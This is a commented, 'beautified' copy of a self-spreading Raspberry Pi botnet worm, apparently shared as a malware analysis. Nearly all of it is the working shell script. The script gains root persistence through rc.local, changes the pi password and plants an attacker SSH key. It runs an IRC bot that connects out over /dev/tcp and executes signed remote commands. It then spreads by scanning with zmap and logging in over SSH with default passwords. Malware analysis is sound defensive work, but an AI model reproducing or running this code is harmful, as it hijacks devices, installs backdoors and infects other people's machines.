# ------------------------------------------------------------------------
#
# Beautified IRCbot
#
# This is a beautified and commented version of a Raspberry Pi IRC
# bot with hash:
#
# 6219350256e5404374c4e99e71ecc1db0a0e3893a09b6aec4c15763023eeffc3
#
# DISCLAIMER:
#
# This program and its source files are only uploaded for educational
# purposes. DO NOT EXECUTE this program on your personal computer or in
# any other machine if you do not understand what it does and what the
# risks are.
#
# ------------------------------------------------------------------------

# This looks like a sandox signature. I think cowrie added something like
# this when receiving a file, but I need to double check it.
C0755 4745 oHOssU2e

#!/bin/bash

# Gets the resolved absolute file path for the script
# Echoing it to /dev/null seems to be a debug feature
MYSELF=`realpath $0`
DEBUG=/dev/null
echo $MYSELF >> $DEBUG


# If not root, add persistence to run at boot as root, and then reboot
if [ "$EUID" -ne 0 ]
then 
        # Gets a temporary file name (note the -u flag, which does not
        # create the file)
        NEWMYSELF=`mktemp -u 'XXXXXXXX'`
        # Copy the script to /opt using the newly generated file name
        sudo cp $MYSELF /opt/$NEWMYSELF
        # Add the (copy of the) script to rc.local so it runs at boot
        # Note that you can sudo. Apparently, passwordless sudo is common
        # in raspbian's default configuration
        sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"
        sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"
        sudo sh -c "echo 'exit 0' >> /etc/rc.local"
        sleep 1
        # Reboot
        sudo reboot
else
# Running with root privileges from this point on.


# Creates a temporary file. The purpose of this operation is not clear.
TMP1=`mktemp`
echo $TMP1 >> $DEBUG

# Kill (by name) a number of processes. Many of them are miners and a
# well-known botnet, while others are regular packages. This is similar
# to what Linux.MulDrop does to kill processes that compete for the CPU.
killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
killall kaiten
killall perl

# This host aliasing is curious ...
echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts

# Deletes .bashrc for the root and pi users. Strong evidence that it
# targets raspberry pi devices.
rm -rf /root/.bashrc
rm -rf /home/pi/.bashrc

# Changes the password for the pi user. Crack this hash to find out what
# the new password is..
usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi

# Creates the .ssh directory for root if it doesn't exist and appends a
# public key to the authorized keys files, allowing the attacker to access
# remotely via ssh. This adds another layer of persistence.
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys

# Adds Google DNS to the device's DNS server pool
echo "nameserver 8.8.8.8" >> /etc/resolv.conf

# Removes temporal files associated with cpuminir and kaiten processes
# that were stopped earlier.
rm -rf /tmp/ktx*
rm -rf /tmp/cpuminer-multi
rm -rf /var/tmp/kaiten


# Drops a hardcoded public key to a file
cat > /tmp/public.pem <<EOFMARKER
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs
glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW
rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF
WRq+Z8HYMvPlgSRA3wIDAQAB
-----END PUBLIC KEY-----
EOFMARKER


# Pick a file name and drop the bot code (another shell script) to it
BOT=`mktemp -u 'XXXXXXXX'`

cat > /tmp/$BOT <<'EOFMARKER'
#!/bin/bash

# Produce a 9-character nickname for this bot starting with 'a' and the
# last 4 bytes (in hex) of the MD5 of the OS name. This is a sub-par
# choice and will likely result in many collisions.
SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
NICK=a${SYS:24}
while [ true ]; do

        # Selects randomly a server out of the list of six hardcoded in the
        # $arr array
        arr[0]="ix1.undernet.org"
        arr[1]="ix2.undernet.org"
        arr[2]="Ashburn.Va.Us.UnderNet.org"
        arr[3]="Bucharest.RO.EU.Undernet.Org"
        arr[4]="Budapest.HU.EU.UnderNet.org"
        arr[5]="Chicago.IL.US.Undernet.org"
        rand=$[$RANDOM % 6]
        svr=${arr[$rand]}

        # Uses file descriptor 3 for a connection with the chosen server.
        # This is likely an IRC server (port 6667)
        eval 'exec 3<>/dev/tcp/$svr/6667;'
        if [[ ! "$?" -eq 0 ]] ; then
                        continue
        fi

        # Possibly a debug artefact
        echo $NICK

        # Sets nickname in the IRC channel
        eval 'printf "NICK $NICK\r\n" >&3;'
        if [[ ! "$?" -eq 0 ]] ; then
                        continue
        fi

        # Sets the username ('user'). Note the user mode ('8'), which asks
        # the channel to set the user as invisible
        eval 'printf "USER user 8 * :IRC hi\r\n" >&3;'
        if [[ ! "$?" -eq 0 ]] ; then
                continue
        fi

        # C2 loop. The bot accepts 2 commands:
        #    - PING: replies with PONG and the text contained in the PING
        #            messsage
        #    - PRIVMSG: executes command contained in the message. The bot
        #            verifies it has been signed with the private key
        #            associated to the public key contained in the bot. The
        #            results are returned base64 encoded.

        # Main loop
        while [ true ]; do
                eval "read msg_in <&3;"

                if [[ ! "$?" -eq 0 ]] ; then
                        break
                fi

                # PING message
                if  [[ "$msg_in" =~ "PING" ]] ; then
                        printf "PONG %s\n" "${msg_in:5}";
                        # ${msg_in:5} contains message after "PING "
                        eval 'printf "PONG %s\r\n" "${msg_in:5}" >&3;'
                        if [[ ! "$?" -eq 0 ]] ; then
                                break
                        fi
                        sleep 1
                        # Joins the #biret IRC channel
                        eval 'printf "JOIN #biret\r\n" >&3;'
                        if [[ ! "$?" -eq 0 ]] ; then
                                break
                        fi
                # PRIVMSG message
                elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
                        # The message has the following structure, though the first bytes before
                        # the first ':' could have a different layout:
                        #
                        #       PRIVMSG:Nickname!X:Signature:Data
                        #
                        # Both the 'Signature' and 'Data' fields are base 64 encoded. The signature
                        # was generated using RSA over the MD5 hash of the data field.
                        #
                        privmsg_h=$(echo $msg_in| cut -d':' -f 3)
                        privmsg_data=$(echo $msg_in| cut -d':' -f 4)
                        privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)

                        # Verifies that the signature is correct using the public key hardcoded in the
                        # script that dropped this bot, which was written in /tmp/public.pem
                        hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
                        sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`

                        # If the signature is correct ...
                        if [[ "$sign" == "$hash" ]] ; then
                                # Extracts the command from the payload. Then decodes it and
                                # runs it
                                CMD=`echo $privmsg_data | base64 -d -i`
                                RES=`bash -c "$CMD" | base64 -w 0`
                                # Sends to the IRC channel the command output base64 encoded
                                eval 'printf "PRIVMSG $privmsg_nick :$RES\r\n" >&3;'
                                if [[ ! "$?" -eq 0 ]] ; then
                                        break
                                fi
                        fi
                fi
        done
done
EOFMARKER


# Makes the bot file executable and runs it with nohup. The output goes to
# /tmp/bot.log.
#
# The nohup artefacts (nohup.log and nohup.out) and the bot script are
# deleted.
chmod +x /tmp/$BOT
nohup /tmp/$BOT 2>&1 > /tmp/bot.log &
rm /tmp/nohup.log -rf
rm -rf nohup.out
sleep 3
rm -rf /tmp/$BOT

# This is a temporary file name that will be used later to copy this
# script to a remote infected system
NAME=`mktemp -u 'XXXXXXXX'`

# Unused. Possibly a debug artefact
date > /tmp/.s

# Installs zmap and sshpass, which are used in the propagation loop below.
apt-get update -y --force-yes
apt-get install zmap sshpass -y --force-yes

# Infection loop. It scans for systems with the 22 port open and then
# attempts to connect using two default passwords. If successful, it
# copies itself (this script) to the remote system and runs it.
while [ true ]; do
        FILE=`mktemp`
        # Scans 100,000 systems that have port 22 (ssh) open
        zmap -p 22 -o $FILE -n 100000
        # Kills all ssh and scp running process, presumably from a
        # previous loop iteration
        killall ssh scp
        # Iterates over each IP address returned by zmap
        for IP in `cat $FILE`
        do
                # Both lines are identical except for the use of a different
                # default password ("raspberry" and "raspberryraspberry993311")
                # for the username "pi". If the scp command works, it connects
                # via ssh, grants the script execution permission and runs it.
                sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
                sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
        done
        # Removes the file with the IP addresses returned by zmap and
        # sleeps for 10 seconds before starting over again.
        rm -rf $FILE
        sleep 10
done

fi

# Trailing bytes (0x0A0A0A00). Possibly a sandbox signature.

 